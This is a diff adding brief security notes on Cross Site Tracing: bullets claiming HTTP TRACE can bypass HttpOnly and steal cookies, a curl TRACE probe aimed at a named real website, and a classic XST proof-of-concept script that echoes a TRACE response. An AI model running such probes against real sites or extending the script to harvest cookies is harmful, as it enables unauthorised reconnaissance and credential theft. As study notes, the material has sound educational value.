@@ -1,0 +1,26 @@
+Cross Site Tracing
+
+TRACE
+~ used for debug and connection analysis
+~ easy to way to tell what an http client is sending and what the server is receiving
+~ Returns contents of client HTTP requests
+~ can be used to bypass xss protection header such as Httponly flag
+~ can be used to steal cookies and credentials
+
+
+https://www.smart-weblications.de/js/jsxc/lib/jsxc.dep.js
+
+
+curl -v -X TRACE -H "Header: value=Testing" http://www.smart-weblications.de/
+
+
+<script type=”text/javascript”>
+<!--
+function sendTrace () {
+    var xmlHttp = new ActiveXObject(“Microsoft.XMLHTTP”);
+    xmlHttp.open(“TRACE”, “http://foo.bar”,false);
+    xmlHttp.send();
+    xmlDoc=xmlHttp.responseText;
+    alert(xmlDoc);}
+//-->
+</script>
